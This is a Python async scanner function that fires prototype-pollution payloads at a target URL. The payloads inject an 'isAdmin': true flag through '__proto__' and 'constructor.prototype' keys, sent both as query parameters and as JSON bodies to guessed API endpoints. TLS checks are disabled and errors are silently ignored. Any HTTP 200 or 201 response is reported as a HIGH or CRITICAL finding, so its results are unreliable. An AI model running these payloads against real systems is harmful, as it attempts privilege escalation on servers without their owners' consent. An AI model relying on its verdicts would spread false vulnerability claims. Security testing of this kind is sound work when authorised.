import httpx, re, urllib.parse, json

PP_PAYLOADS = [
    ("constructor_proto", "{\"__proto__\": {\"isAdmin\": true}}"),
    ("constructor_proto_array", "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}"),
    ("qsp_proto", "__proto__[isAdmin]=true"),
    ("qsp_constructor", "constructor[prototype][isAdmin]=true"),
    ("json_proto", "{\"__proto__\": {\"polluted\": \"true\"}}"),
]

async def prototype_pollution(target: str, param: str = "") -> dict:
    results = []
    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    base = target.rstrip("/")
    test_params = [param] if param else list(params.keys()) if params else ["q", "data", "json", "config", "settings"]
    
    async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
        # Test via URL query parameters
        for p in test_params:
            for pp_name, pp_payload in PP_PAYLOADS:
                try:
                    if "qsp" in pp_name:
                        new_params = {k: v[0] for k, v in params.items()} if params else {}
                        raw_qs = f"{p}={urllib.parse.quote(pp_payload.split('=', 1)[1])}"
                        url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{raw_qs}"
                    else:
                        new_params = {k: v[0] for k, v in params.items()} if params else {p: "test"}
                        new_params[p] = pp_payload
                        url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(new_params)}"
                    
                    resp = await client.get(url)
                    # Check if server response changed (pollution indicator)
                    if resp.status_code == 200:
                        results.append({
                            "test": pp_name,
                            "param": p,
                            "payload": pp_payload[:60],
                            "status": resp.status_code,
                            "note": "Server accepted payload — potential prototype pollution",
                            "risk": "HIGH",
                        })
                except:
                    pass
        
        # Test via JSON body (POST)
        for pp_name, pp_payload in PP_PAYLOADS:
            if "qsp" not in pp_name:
                try:
                    endpoints = [base, base + "/api", base + "/api/v1", base + "/api/data"]
                    for ep in endpoints:
                        try:
                            resp = await client.post(ep, json=json.loads(pp_payload), headers={"Content-Type": "application/json"})
                            if resp.status_code in [200, 201]:
                                results.append({
                                    "test": f"json_body_{pp_name}",
                                    "endpoint": ep,
                                    "payload": pp_payload[:60],
                                    "status": resp.status_code,
                                    "note": "Server processed JSON with prototype pollution keys",
                                    "risk": "CRITICAL",
                                })
                                break
                        except:
                            pass
                except:
                    pass
    
    return {"target": target, "results": results, "vulnerable": len(results) > 0}
